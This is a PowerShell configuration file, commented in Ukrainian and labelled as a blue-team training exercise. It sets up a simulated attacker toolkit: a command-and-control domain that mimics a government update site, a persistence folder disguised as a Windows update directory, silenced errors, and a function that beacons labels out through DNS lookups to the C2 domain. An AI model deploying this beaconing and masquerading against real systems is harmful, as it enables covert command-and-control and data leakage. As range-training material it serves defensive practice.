# =============================================================================
# config.ps1 — Спільна конфігурація для всіх блоків
# Dot-source на початку кожного блоку: . "$PSScriptRoot\config.ps1"
# EXERCISE ONLY — CyberRanges blue team training
# =============================================================================

$ErrorActionPreference = "SilentlyContinue"

# ── C2 ────────────────────────────────────────────────────────────────────────
# Тільки домен — IP резолвиться платформою через DNS
$C2_DOMAIN = "updates-gov.net"

# ── Шляхи ────────────────────────────────────────────────────────────────────
$LOG_DIR     = "C:\ProgramData\upd_logs"
$PERSIST_DIR = "$env:APPDATA\Microsoft\WinUpd"

# ── Логування ─────────────────────────────────────────────────────────────────
# $BLOCK_TAG і $LogPath — встановлюються в кожному блоці ДО dot-source
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $log_dir = Split-Path $LogPath
    if (-not (Test-Path $log_dir)) {
        New-Item -Path $log_dir -ItemType Directory -Force | Out-Null
    }
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts [$BLOCK_TAG][$Level] $Message" | Out-File -FilePath $LogPath -Append -Encoding UTF8
}

# ── DNS Beacon ────────────────────────────────────────────────────────────────
function Invoke-DnsBeacon {
    param([string]$Label)
    # Пряме ASCII кодування — без base64 (уникаємо колізій x/y)
    $safe = $Label -replace '[^a-zA-Z0-9]', '-' -replace '-{2,}', '-'
    $safe = $safe.Trim('-')
    if ($safe.Length -gt 60) { $safe = $safe.Substring(0, 60) }
    Resolve-DnsName "$safe.$C2_DOMAIN" -Type A -ErrorAction SilentlyContinue | Out-Null
}
